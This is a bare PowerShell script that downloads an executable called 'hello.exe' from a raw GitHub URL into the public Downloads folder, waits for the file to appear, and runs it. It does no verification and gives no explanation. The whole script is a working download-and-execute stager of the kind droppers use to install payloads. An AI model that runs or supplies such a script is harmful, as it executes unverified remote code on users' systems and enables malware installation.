$downloadUrl = "https://raw.githubusercontent.com/Eric970619/page/main/hello.exe"
$destinationPath = "C:\Users\Public\Downloads\hello.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($downloadUrl, $destinationPath)

while (-not (Test-Path $destinationPath)) {
    Start-Sleep -Seconds 1
}
Start-Process -FilePath $destinationPath
